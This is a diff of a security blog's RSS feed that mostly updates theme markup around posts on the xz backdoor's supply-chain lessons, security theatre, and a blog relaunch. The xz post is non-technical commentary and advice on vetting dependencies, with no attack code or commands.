@@ -1,29 +1,29 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>appsec &amp; stuff</title><link>https://appsec.space/</link><description>appsec &amp; stuff</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 30 Mar 2024 19:49:24 +0100</lastBuildDate><atom:link href="https://appsec.space/index.xml" rel="self" type="application/rss+xml"/><item><title>The xz backdoor from a Security Engineer persepective</title><link>https://appsec.space/posts/xz-backdoor/</link><pubDate>Sat, 30 Mar 2024 19:49:24 +0100</pubDate><author><name>himazawa</name></author><guid>https://appsec.space/posts/xz-backdoor/</guid><description><![CDATA[<div class="featured-image">
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>appsec &amp; stuff</title><link>https://appsec.space/</link><description>appsec &amp; stuff</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 02 Aug 2024 12:00:00 +0100</lastBuildDate><atom:link href="https://appsec.space/index.xml" rel="self" type="application/rss+xml"/><item><title>The xz backdoor from a Security Engineer persepective</title><link>https://appsec.space/posts/xz-backdoor/</link><pubDate>Sat, 30 Mar 2024 19:49:24 +0100</pubDate><author><name>himazawa</name></author><guid>https://appsec.space/posts/xz-backdoor/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/posts/xz-backdoor/xz.png" referrerpolicy="no-referrer">
             </div><p>As you probably already heard, the <code>xz</code> package got compromised.</p>
 <p>The package was used as entrypoint to inject malicious code in sshd, altering the authentication flow. This forged vulnerability is now known as <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3094" target="_blank" rel="noopener noreferrer">CVE-2024-3094</a>.</p>
 <p>Looks like the injected code <a href="https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b" target="_blank" rel="noopener noreferrer">takes the payload from a specific key and execute it</a>.</p>
 <div class="details admonition info open">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-info-circle fa-fw"></i>Info<i class="details-icon fas fa-angle-right fa-fw"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content">The situation is still ongoing, more details will emerge in the near future and I will update this post accordingly.</div>
-        </div>
+    <div class="details-summary admonition-title">
+        <span class="icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196 0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627 0 12 5.373 12 12v100h12c6.627 0 12 5.373 12 12v24z"/></svg></span>Info<span class="details-icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></span>
     </div>
+    <div class="details-content">
+        <div class="admonition-content">The situation is still ongoing, more details will emerge in the near future and I will update this post accordingly.</div></div></div>
 <p>This is probably a full fledged operation due to its methodology and duration but I&rsquo;m not the right guy to talk about OpSec and Threat Actors attributions.
 Check the Resources section for additional links.</p>
 <p>The situation doesn&rsquo;t look too good so I&rsquo;m trying to write this blogpost as a summary.</p>
 <p>I don&rsquo;t want to address the technical aspect of the compromission but I want to look at the issue from the perspective of a Security Engineer, summarizing what went wrong and trying to find a remediation.</p>
 <h2 id="timeline" class="headerLink">
-    <a href="#timeline" class="header-mark"></a>1 Timeline</h2><div class="details admonition tip">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content">Check the Resources section for a link to an article with a detailed timeline</div>
-        </div>
+    <a href="#timeline" class="header-mark" aria-label="Header mark for 'Timeline'"></a>1 Timeline</h2><div class="details admonition tip">
+    <div class="details-summary admonition-title">
+        <span class="icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M96.06 454.35c.01 6.29 1.87 12.45 5.36 17.69l17.09 25.69a31.99 31.99 0 0 0 26.64 14.28h61.71a31.99 31.99 0 0 0 26.64-14.28l17.09-25.69a31.989 31.989 0 0 0 5.36-17.69l.04-38.35H96.01l.05 38.35zM0 176c0 44.37 16.45 84.85 43.56 115.78 16.52 18.85 42.36 58.23 52.21 91.45.04.26.07.52.11.78h160.24c.04-.26.07-.51.11-.78 9.85-33.22 35.69-72.6 52.21-91.45C335.55 260.85 352 220.37 352 176 352 78.61 272.91-.3 175.45 0 73.44.31 0 82.97 0 176zm176-80c-44.11 0-80 35.89-80 80 0 8.84-7.16 16-16 16s-16-7.16-16-16c0-61.76 50.24-112 112-112 8.84 0 16 7.16 16 16s-7.16 16-16 16z"/></svg></span>Tip<span class="details-icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></span>
     </div>
+    <div class="details-content">
+        <div class="admonition-content">Check the Resources section for a link to an article with a detailed timeline</div></div></div>
 <ul>
 <li>
 <p><strong>2023</strong>:</p>
@@ -62,7 +62,7 @@ He was optimizing his infrastructure and found that ssh was  suspiciously slow. 
 </li>
 </ul>
 <h2 id="impacted-components" class="headerLink">
-    <a href="#impacted-components" class="header-mark"></a>2 Impacted components</h2><p>The extent of this breach is still unkown, but here is a (partial) list of components shipping the known malicious version of <code>xz</code>:</p>
+    <a href="#impacted-components" class="header-mark" aria-label="Header mark for 'Impacted components'"></a>2 Impacted components</h2><p>The extent of this breach is still unkown, but here is a (partial) list of components shipping the known malicious version of <code>xz</code>:</p>
 <p>Distributions:</p>
 <ul>
 <li><a href="https://archlinux.org/news/the-xz-package-has-been-backdoored/" target="_blank" rel="noopener noreferrer">Arch</a></li>
@@ -84,37 +84,29 @@ He was optimizing his infrastructure and found that ssh was  suspiciously slow. 
 </ul>
 <p>At the moment we know that there are checks in the backdoor to <a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27#design" target="_blank" rel="noopener noreferrer">target Linux instances and only x86_64/amd64</a> builds so the real number could be downsized, but since the entire situation is unclear I would not reccommend to keep a compromised package on your system.</p>
 <h2 id="considerations" class="headerLink">
-    <a href="#considerations" class="header-mark"></a>3 Considerations</h2><h3 id="the-github-behavior" class="headerLink">
-    <a href="#the-github-behavior" class="header-mark"></a>3.1 The GitHub Behavior</h3><p>The reasons behind the <code>xz</code> repositories lockdown are still a mistery to me, especially knowing that with the source code available additional anaysis on the backdoor could be performed.</p>
+    <a href="#considerations" class="header-mark" aria-label="Header mark for 'Considerations'"></a>3 Considerations</h2><h3 id="the-github-behavior" class="headerLink">
+    <a href="#the-github-behavior" class="header-mark" aria-label="Header mark for 'The GitHub Behavior'"></a>3.1 The GitHub Behavior</h3><p>The reasons behind the <code>xz</code> repositories lockdown are still a mistery to me, especially knowing that with the source code available additional anaysis on the backdoor could be performed.</p>
 <p>Blocking access to the source code is something that will delay further results, that is honestly really bad for time-critical situation like this one. An updated mirror is available <a href="https://git.tukaani.org/?p=xz.git;a=summary" target="_blank" rel="noopener noreferrer">here</a></p>
 <h3 id="the-downgrades" class="headerLink">
-    <a href="#the-downgrades" class="header-mark"></a>3.2 The downgrades</h3><p>The patch strategy for basically everyone was to force a downgrade from the <code>5.6.0</code>-<code>5.6.1</code> to another version.<br>
+    <a href="#the-downgrades" class="header-mark" aria-label="Header mark for 'The downgrades'"></a>3.2 The downgrades</h3><p>The patch strategy for basically everyone was to force a downgrade from the <code>5.6.0</code>-<code>5.6.1</code> to another version.<br>
 Some (homebrew, for example), forced the downgrade to 5.4.6.</p>
 <p>This looks interesting because for sure we know there is a backdoor on that (<code>5.6.0</code>-<code>5.6.1</code>) versions, but we also know that the attacker has been working on the repository for over two years.</p>
 <p>The <code>5.4.6</code> version is also builded by the attacker and honestly wouldn&rsquo;t trust it much.</p>
 <h2 id="how-to-prevent-this-issue" class="headerLink">
-    <a href="#how-to-prevent-this-issue" class="header-mark"></a>4 How to prevent this issue?</h2><p>As I said at the beginning of the post, I don&rsquo;t want to go too deep into the technical analysis of the backdoor, for two main reasons: with the sourcecode locked and only <a href="https://github.com/xz-mirror/xz" target="_blank" rel="noopener noreferrer">an archive available</a> the informations are incomplete and I really don&rsquo;t want to reverse the <code>xz</code> binary.
+    <a href="#how-to-prevent-this-issue" class="header-mark" aria-label="Header mark for 'How to prevent this issue?'"></a>4 How to prevent this issue?</h2><p>As I said at the beginning of the post, I don&rsquo;t want to go too deep into the technical analysis of the backdoor, for two main reasons: with the sourcecode locked and only <a href="https://github.com/xz-mirror/xz" target="_blank" rel="noopener noreferrer">an archive available</a> the informations are incomplete and I really don&rsquo;t want to reverse the <code>xz</code> binary.
 Also, and this is the more important reasons, people more knowledgeable than me on Threat Actors behaviors are already on it.
 I will just link their posts once are ready, so make sure to check the Resources section below.</p>
 <p>One thing I can do here is showing the point of view of a Security Engineer on the issue, how I would mitigate the problem and what steps went wrong.</p>
 <div class="details admonition note">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content">TL;DR: there isn&rsquo;t an actual solution</div>
-        </div>
+    <div class="details-summary admonition-title">
+        <span class="icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg></span>Note<span class="details-icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></span>
     </div>
+    <div class="details-content">
+        <div class="admonition-content">TL;DR: there isn&rsquo;t an actual solution</div></div></div>
 <h3 id="trust-issues" class="headerLink">
-    <a href="#trust-issues" class="header-mark"></a>4.1 Trust issues</h3><p><figure><a class="lightgallery" href="https://imgs.xkcd.com/comics/dependency_2x.png" title="https://imgs.xkcd.com/comics/dependency_2x.png" data-thumbnail="https://imgs.xkcd.com/comics/dependency_2x.png">
-        <img
-            
-            loading="lazy"
-            src="https://imgs.xkcd.com/comics/dependency_2x.png"
-            srcset="https://imgs.xkcd.com/comics/dependency_2x.png, https://imgs.xkcd.com/comics/dependency_2x.png 1.5x, https://imgs.xkcd.com/comics/dependency_2x.png 2x"
-            sizes="auto"
-            alt="https://imgs.xkcd.com/comics/dependency_2x.png">
-    </a></figure></p>
+    <a href="#trust-issues" class="header-mark" aria-label="Header mark for 'Trust issues'"></a>4.1 Trust issues</h3><p><img class="tw-inline" loading="lazy" src="https://imgs.xkcd.com/comics/dependency_2x.png"     ></p>
 <p><code>xz</code> is a software mainteined (up until 2023) by 1 single guy. Later another maintainer joined but unfortunately for us, it was the same guy pushing the backdoor to upstream.
 This crashes against the fact that <code>xz</code> is an incredibly popular package available in a lot of distributions and being a dependency of many softwares.</p>
 <p>This was likely seen by the attacker as a gold mine since it was easy to get the role of maintainer of the project and push the malicious code.</p>
@@ -129,36 +121,36 @@ One of the biggest gimmicks of Open Source security is people beliving that sinc
 <p>Every time a discussion like that appears I always remember the <a href="https://blog.infosectcbr.com.au/2018/11/pitfalls-using-strcat.html" target="_blank" rel="noopener noreferrer">InfosectCBR&rsquo;s &ldquo;Month of Kali&rdquo;</a> where <a href="https://twitter.com/silviocesare" target="_blank" rel="noopener noreferrer">Silvio Cesare</a> spent a month popping vulnerabilities on Kali Linux software.</p>
 <p>But which factors could contribute on minimizing the risks?</p>
 <h3 id="github-stats" class="headerLink">
-    <a href="#github-stats" class="header-mark"></a>4.2 GitHub Stats</h3><p>Just to be clear from the beginning: No, you can&rsquo;t trust this kind of metrics.</p>
+    <a href="#github-stats" class="header-mark" aria-label="Header mark for 'GitHub Stats'"></a>4.2 GitHub Stats</h3><p>Just to be clear from the beginning: No, you can&rsquo;t trust this kind of metrics.</p>
 <p>There is an hidden market of buying and selling GitHub stats like stars, forks etc.
 You can read a nice article here: <a href="https://dagster.io/blog/fake-stars" target="_blank" rel="noopener noreferrer">https://dagster.io/blog/fake-stars</a></p>
 <h3 id="community-engagement" class="headerLink">
-    <a href="#community-engagement" class="header-mark"></a>4.3 Community Engagement</h3><p>Evaluate the size and engagement of the community surrounding the project.</p>
+    <a href="#community-engagement" class="header-mark" aria-label="Header mark for 'Community Engagement'"></a>4.3 Community Engagement</h3><p>Evaluate the size and engagement of the community surrounding the project.</p>
 <p>A large and active community can provide additional eyes for reviewing code, reporting bugs, and addressing security issues promptly. <code>xz/liblzma</code> had litterally 2 maintainers and one was the malicious actor.</p>
 <h3 id="funding-and-support" class="headerLink">
-    <a href="#funding-and-support" class="header-mark"></a>4.4 Funding and Support</h3><p>Consider whether the project receives financial support or sponsorship from reputable organizations. Projects with dedicated funding tend to have more resources available for security audits and ongoing maintenance.
+    <a href="#funding-and-support" class="header-mark" aria-label="Header mark for 'Funding and Support'"></a>4.4 Funding and Support</h3><p>Consider whether the project receives financial support or sponsorship from reputable organizations. Projects with dedicated funding tend to have more resources available for security audits and ongoing maintenance.
 And also are less likely to be completely abandoned.</p>
 <div class="details admonition tip">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content">Remember: you want to rely on that dependency for the whole week, not only during the maintainer&rsquo;s freetime, projects with a nice financial support will likely be full-time jobs and not just hobbies.</div>
-        </div>
+    <div class="details-summary admonition-title">
+        <span class="icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M96.06 454.35c.01 6.29 1.87 12.45 5.36 17.69l17.09 25.69a31.99 31.99 0 0 0 26.64 14.28h61.71a31.99 31.99 0 0 0 26.64-14.28l17.09-25.69a31.989 31.989 0 0 0 5.36-17.69l.04-38.35H96.01l.05 38.35zM0 176c0 44.37 16.45 84.85 43.56 115.78 16.52 18.85 42.36 58.23 52.21 91.45.04.26.07.52.11.78h160.24c.04-.26.07-.51.11-.78 9.85-33.22 35.69-72.6 52.21-91.45C335.55 260.85 352 220.37 352 176 352 78.61 272.91-.3 175.45 0 73.44.31 0 82.97 0 176zm176-80c-44.11 0-80 35.89-80 80 0 8.84-7.16 16-16 16s-16-7.16-16-16c0-61.76 50.24-112 112-112 8.84 0 16 7.16 16 16s-7.16 16-16 16z"/></svg></span>Tip<span class="details-icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></span>
     </div>
+    <div class="details-content">
+        <div class="admonition-content">Remember: you want to rely on that dependency for the whole week, not only during the maintainer&rsquo;s freetime, projects with a nice financial support will likely be full-time jobs and not just hobbies.</div></div></div>
 <h3 id="sdlc" class="headerLink">
-    <a href="#sdlc" class="header-mark"></a>4.5 SDLC</h3><p>A good portion of the evaluation should also focus on the SDLC to e ensure security (and quality in general) gates are correcly implemented, approvals on PRs are mandatory and there are healthy practices in place to prevent one single contributor to push malicious code without approval.</p>
+    <a href="#sdlc" class="header-mark" aria-label="Header mark for 'SDLC'"></a>4.5 SDLC</h3><p>A good portion of the evaluation should also focus on the SDLC to e ensure security (and quality in general) gates are correcly implemented, approvals on PRs are mandatory and there are healthy practices in place to prevent one single contributor to push malicious code without approval.</p>
 <p>Also take in considerations that we are humans, and we make errors. Passing a code review doesn&rsquo;t mean the code is safe, as I said before: there is no real solution, just ways to decrease the probablity for the bad stuff to happen.</p>
 <h3 id="enterprise-vs-individual" class="headerLink">
-    <a href="#enterprise-vs-individual" class="header-mark"></a>4.6 Enterprise vs Individual</h3><p>This is a controversial topic because there are projects that are maintained by individuals that are well structured but usually relying on (large) enterprise projects will ensure their SDLC best practices are followed, money are keeping the project alive, and a big company is less likely to go all in and backdoor their project on purpose. Again, this just increases the probablity, don&rsquo;t take it for granted ;)</p>
+    <a href="#enterprise-vs-individual" class="header-mark" aria-label="Header mark for 'Enterprise vs Individual'"></a>4.6 Enterprise vs Individual</h3><p>This is a controversial topic because there are projects that are maintained by individuals that are well structured but usually relying on (large) enterprise projects will ensure their SDLC best practices are followed, money are keeping the project alive, and a big company is less likely to go all in and backdoor their project on purpose. Again, this just increases the probablity, don&rsquo;t take it for granted ;)</p>
 <h3 id="recursive-controls" class="headerLink">
-    <a href="#recursive-controls" class="header-mark"></a>4.7 Recursive controls</h3><p>The project you are including will probably also have dependencies, make sure the same scrutiny is applied by the project maintainers on their supply chain to avoid indirect compromission.</p>
+    <a href="#recursive-controls" class="header-mark" aria-label="Header mark for 'Recursive controls'"></a>4.7 Recursive controls</h3><p>The project you are including will probably also have dependencies, make sure the same scrutiny is applied by the project maintainers on their supply chain to avoid indirect compromission.</p>
 <h2 id="conclusion" class="headerLink">
-    <a href="#conclusion" class="header-mark"></a>5 Conclusion</h2><p>The <code>xz</code> backdoor is yet another case of supply chain hijacking, but this time with way more complexity and effort behind it.</p>
+    <a href="#conclusion" class="header-mark" aria-label="Header mark for 'Conclusion'"></a>5 Conclusion</h2><p>The <code>xz</code> backdoor is yet another case of supply chain hijacking, but this time with way more complexity and effort behind it.</p>
 <p>We shound&rsquo;t blame the current maintainer or the Open Source software: issues like that (intentional or not) are mostly unpatchable because they leverage the human factor that is inreplaceable.</p>
 <p>On the other hand we can follow some best practices in picking software to integrate inside our repositories to reduce the chance of this from happening.</p>
 <h2 id="resources" class="headerLink">
-    <a href="#resources" class="header-mark"></a>6 Resources</h2><ul>
+    <a href="#resources" class="header-mark" aria-label="Header mark for 'Resources'"></a>6 Resources</h2><ul>
 <li>OSS-Security List: <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4" target="_blank" rel="noopener noreferrer">https://www.openwall.com/lists/oss-security/2024/03/29/4</a></li>
 <li>Comprehensive timeline: <a href="https://boehs.org/node/everything-i-know-about-the-xz-backdoor" target="_blank" rel="noopener noreferrer">https://boehs.org/node/everything-i-know-about-the-xz-backdoor</a></li>
 <li>Compromise link roundup: <a href="https://shellsharks.com/xz-compromise-link-roundup" target="_blank" rel="noopener noreferrer">https://shellsharks.com/xz-compromise-link-roundup</a></li>
@@ -170,7 +162,7 @@ And also are less likely to be completely abandoned.</p>
                 <img src="/posts/security-theatre/cargocult.jpg" referrerpolicy="no-referrer">
             </div><p>I have seen many companies invest significant time and resources into security measures that have little to no actual effect on security. This is commonly referred to as &ldquo;security theater&rdquo;.</p>
 <h2 id="what-is-the-security-theatre" class="headerLink">
-    <a href="#what-is-the-security-theatre" class="header-mark"></a>1 What is the Security Theatre</h2><p>Security theater refers to the practice of implementing security measures for the sake of appearances, without any significant impact on actual security. These measures may give the illusion of protection, but in reality, they provide little to no real security benefits.</p>
+    <a href="#what-is-the-security-theatre" class="header-mark" aria-label="Header mark for 'What is the Security Theatre'"></a>1 What is the Security Theatre</h2><p>Security theater refers to the practice of implementing security measures for the sake of appearances, without any significant impact on actual security. These measures may give the illusion of protection, but in reality, they provide little to no real security benefits.</p>
 <p>Organizations often fall into the trap of focusing solely on compliance requirements without considering their actual security needs. Compliance-driven security measures may give the illusion of being protected, but they often fail to address the specific security risks faced by an organization.</p>
 <p>Useless compliance can also result in organizations wasting valuable resources on implementing measures that do not have a significant impact on their security posture. This can lead to a situation where an organization is in compliance with regulations, but the security budget is depleted, while their assets are still vulnerable to attacks.</p>
 <p><a href="https://www.youtube.com/watch?v=vRp7tYWnJJs" target="_blank" rel="noopener noreferrer">Oh, how I love the smell of compliance in the morning</a>.</p>
@@ -182,19 +174,19 @@ And also are less likely to be completely abandoned.</p>
 
 <p>Another example of security theatre is implementing security controls that are not properly configured or maintained. For instance, firewalls, IDS and IPS are a common security measure that are often poorly configured or not kept up-to-date with the latest security patches</p>
 <h2 id="root-cause" class="headerLink">
-    <a href="#root-cause" class="header-mark"></a>2 Root cause</h2><p>Cybersecurity has become the new gold rush, with numerous individuals and organizations seeking to take advantage of the potential financial gains. However, finding skilled personnel to address these security concerns can be challenging, and relying on consultants can lead to a situation where the organization becomes overly dependent on their expertise.</p>
+    <a href="#root-cause" class="header-mark" aria-label="Header mark for 'Root cause'"></a>2 Root cause</h2><p>Cybersecurity has become the new gold rush, with numerous individuals and organizations seeking to take advantage of the potential financial gains. However, finding skilled personnel to address these security concerns can be challenging, and relying on consultants can lead to a situation where the organization becomes overly dependent on their expertise.</p>
 <h2 id="wrapping-up" class="headerLink">
-    <a href="#wrapping-up" class="header-mark"></a>3 Wrapping up</h2><p>Organizations can protect themselves from the constant security threats by taking a proactive approach. The first step is to gain a thorough understanding of the specific risks they are facing and then implement the necessary measures to mitigate these risks. This includes educating their employees to be aware of potential attacks and how to respond in such situations.</p>
+    <a href="#wrapping-up" class="header-mark" aria-label="Header mark for 'Wrapping up'"></a>3 Wrapping up</h2><p>Organizations can protect themselves from the constant security threats by taking a proactive approach. The first step is to gain a thorough understanding of the specific risks they are facing and then implement the necessary measures to mitigate these risks. This includes educating their employees to be aware of potential attacks and how to respond in such situations.</p>
 <p>In conclusion, to avoid being caught in the trap of &ldquo;security theater&rdquo;, organizations must concentrate on establishing practical security measures and regularly evaluate their effectiveness. Having a well-thought-out response plan in place is also critical in ensuring the protection of the organization&rsquo;s assets.</p>
 <p>Additionally, organizations should cease creating redundant policies that serve no purpose in enhancing the organization&rsquo;s overall security posture.</p>
 <div class="details admonition tip open">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content"><a href="https://www.philvenables.com/post/ceremonial-security-and-cargo-cults" target="_blank" rel="noopener noreferrer">Here</a> you can find an interesting article from Phil Venables, Google CISO, about Cerimonial Security and Cargo Cults</div>
-        </div>
-    </div>]]></description></item><item><title>Long Time No See</title><link>https://appsec.space/posts/long-time-no-see/</link><pubDate>Mon, 06 Feb 2023 00:01:18 +0100</pubDate><author><name>himazawa</name></author><guid>https://appsec.space/posts/long-time-no-see/</guid><description><![CDATA[<div class="featured-image">
+    <div class="details-summary admonition-title">
+        <span class="icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M96.06 454.35c.01 6.29 1.87 12.45 5.36 17.69l17.09 25.69a31.99 31.99 0 0 0 26.64 14.28h61.71a31.99 31.99 0 0 0 26.64-14.28l17.09-25.69a31.989 31.989 0 0 0 5.36-17.69l.04-38.35H96.01l.05 38.35zM0 176c0 44.37 16.45 84.85 43.56 115.78 16.52 18.85 42.36 58.23 52.21 91.45.04.26.07.52.11.78h160.24c.04-.26.07-.51.11-.78 9.85-33.22 35.69-72.6 52.21-91.45C335.55 260.85 352 220.37 352 176 352 78.61 272.91-.3 175.45 0 73.44.31 0 82.97 0 176zm176-80c-44.11 0-80 35.89-80 80 0 8.84-7.16 16-16 16s-16-7.16-16-16c0-61.76 50.24-112 112-112 8.84 0 16 7.16 16 16s-7.16 16-16 16z"/></svg></span>Tip<span class="details-icon"><svg class="icon"
+    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></span>
+    </div>
+    <div class="details-content">
+        <div class="admonition-content"><a href="https://www.philvenables.com/post/ceremonial-security-and-cargo-cults" target="_blank" rel="noopener noreferrer">Here</a> you can find an interesting article from Phil Venables, Google CISO, about Cerimonial Security and Cargo Cults</div></div></div>]]></description></item><item><title>Long Time No See</title><link>https://appsec.space/posts/long-time-no-see/</link><pubDate>Mon, 06 Feb 2023 00:01:18 +0100</pubDate><author><name>himazawa</name></author><guid>https://appsec.space/posts/long-time-no-see/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/posts/long-time-no-see/header.jpg" referrerpolicy="no-referrer">
             </div><p>Long time no see, uh? Lot of stuff happen since the last post in 2018 on <a href="https://bsod.dev" target="_blank" rel="noopener noreferrer">the old blog</a>.</p>
 <p>Unfortunately I wasn&rsquo;t able to write much, both for the lack of time and the impossibility to share what I learned.
@@ -203,69 +195,128 @@ This post contains an introduction to this new website and how it will work from
 Fortunately I still have time and resources on my job to conduct vulnerability research so occasionally I will post about interesting vulnerabilities I found.
 I would also like to talk about security aspects more related to SDLC, so let&rsquo;s see how it&rsquo;ll go.</p>
 <h2 id="how-this-blog-works" class="headerLink">
-    <a href="#how-this-blog-works" class="header-mark"></a>1 How this blog works</h2><p>The setup is pretty simple, I&rsquo;m using <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">hugo</a> to build static pages and publish them on GitHub pages. There is a <a href="https://github.com/peaceiris/actions-hugo" target="_blank" rel="noopener noreferrer">Github Action</a> running that builds and deploy the pages every time a PR is approved on the <code>main</code> branch.
-<figure><a class="lightgallery" href="/posts/long-time-no-see/blog_CI_CD.png" title="/posts/long-time-no-see/blog_CI_CD.png" data-thumbnail="/posts/long-time-no-see/blog_CI_CD.png" data-sub-html="<h2>A graph represeting the logic flow behind the blog deployment system</h2>">
-        <img
-            
-            loading="lazy"
-            src="/posts/long-time-no-see/blog_CI_CD.png"
-            srcset="/posts/long-time-no-see/blog_CI_CD.png, /posts/long-time-no-see/blog_CI_CD.png 1.5x, /posts/long-time-no-see/blog_CI_CD.png 2x"
-            sizes="auto"
-            alt="/posts/long-time-no-see/blog_CI_CD.png">
-    </a><figcaption class="image-caption">A graph represeting the logic flow behind the blog deployment system</figcaption>
-    </figure></p>
